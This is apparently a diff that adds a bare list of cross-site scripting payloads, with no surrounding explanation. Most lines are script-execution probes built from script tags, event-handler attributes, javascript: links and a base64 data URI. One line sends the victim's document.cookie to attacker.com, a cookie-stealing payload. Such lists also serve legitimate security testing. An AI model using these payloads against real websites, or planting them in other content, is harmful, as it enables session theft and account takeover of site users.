@@ -1,0 +1,11 @@
+"><script>alert(1)</script>
+<script>document.location='http://attacker.com/'+document.cookie</script>
+<img src=x onerror="alert(1)">
+<svg/onload=prompt(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus>
+<input onmouseover=alert(1)>
+<a href="javascript:alert(1)">click me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click me</a>
